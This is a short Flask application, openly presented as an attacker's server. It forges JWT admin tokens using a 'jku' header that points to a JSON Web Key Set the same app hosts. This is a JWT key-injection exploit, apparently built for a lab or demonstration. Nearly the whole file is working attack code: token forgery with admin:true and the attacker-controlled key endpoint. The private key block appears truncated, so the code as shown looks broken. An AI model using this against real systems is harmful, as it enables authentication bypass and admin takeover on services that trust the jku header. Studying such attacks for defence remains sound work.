from flask import Flask
import jwt
import time

app = Flask(__name__)

PRIV_KEY = """-----BEGIN PRIVATE KEY-----

AozE7SuHWAgBu2FL4eNa2MKU
-----END PRIVATE KEY-----"""

@app.route("/")
def main_page():
    return "This is the attacker's server.<br><br><a href=\"/gen\">Generate an admin token with my own private key</a>"

@app.route("/gen")
def gen_token():
    token = jwt.encode({"admin": "true", "iat": int(time.time())}, PRIV_KEY, algorithm="RS256", headers={"jku": "http://localhost:5001/public_keys.json", "kid": "i4Z87WkRf0Vxjg93Sr3OR609JxrjMTIp4qJXHzw2aGs"})
    return  "Here you go:<br><br>{0}<br><br>Return to the <a href=\"/?token={0}\">main page</a>".format(token)

@app.route("/public_keys.json")
def pub_keys():
    return  """
            {
                "keys": [
                    {
                        "kty": "RSA",
                        "e": "AQAB",
                        "use": "sig",
                        "kid": "i4Z87WkRf0Vxjg93Sr3OR609JxrjMTIp4qJXHzw2aGs",
                        "alg": "RS256",
                        "n": "oLyRqcMnFG-YBlajpZNzwVJ-vCV0unkuGjtC6U_OCAjf9zOoEW8-gJzFyXPahrfyORUWs7cc8sHp1qrCmX-zvd55OwJLCScSK_nHReOKsQDyklJ-20G_dqFk01nfWGkl73gfn0oR-NTPRFGASBvV4trOH9i2kvsBAqcWjnFlJDWBzNssUGMPojs_76qis41VA_5k28zOsGS9mKZtsv7nem3kDfywZn0JRHQ1RcZyfvSgbRA5X-inyODhqf6q0HwsXU8yzathyhkjp02fTS5jhe3uGN8Vm7A8Vdvj2WWGYTRMDDZ2QEalUTkV8SBSldRgVoM00FRFpi35bfxIeZ6sNw"
                    }
                ]
            }
            """

if __name__ == "__main__":
    app.run(port=5001)
